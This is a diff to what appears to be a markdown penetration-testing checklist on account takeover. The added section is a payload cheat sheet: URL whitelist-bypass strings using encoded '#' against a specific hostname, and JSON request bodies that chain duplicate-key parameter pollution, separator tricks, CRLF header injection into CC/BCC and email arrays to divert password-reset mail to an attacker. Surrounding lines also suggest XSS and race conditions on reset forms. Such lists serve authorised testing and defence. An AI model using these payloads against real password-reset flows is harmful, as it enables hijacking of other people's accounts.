@@ -462,8 +462,60 @@ admin))(|(|
 ## Remember Me
 If the page has "Remember Me" functionality check how is it implemented and see if you can abuse it to takeover other accounts.
 
+---
+mydomain.com/growanz.hubspot.com
+
+Bypass white list validation
+
+mydomain.com%23@growanz.hubspot.com
+
+mydomain.com%25%32%33@growanz.hubspot.com
+
+```
+{"email":"victim@mail.com","email":"attacker@mail.com"}
+
+{"email":"Victim@gmail.com,Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com,Attacker@gmail.com"}
+
+// Semiclon saperator with HPP chain
+{"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
+// Space saperator with HPP chain
+{"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
 
 
+/ Carbon Copy (CC:) with HPP chain
+{"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
+
+// Blind Carbon Copy (BCC:) with HPP chain
+{"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
+
+
+// Carbon Copy (CC:) with HPP chain
+{"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}
+
+// Blind Carbon Copy (BCC:) with HPP chain
+{"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
+
+
+
+// HPP chain with Bypass the mail() function protection against email header injection
+{"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}
+
+
+// Array of emails
+{"email":["victim@mail.com","attacker@mail.com"]}
+
+
+
+```
+---
 
 1. Try Cross-Site Scripting (XSS) in the form
 2. send victim reset password and attacker reset password with Race Condition 
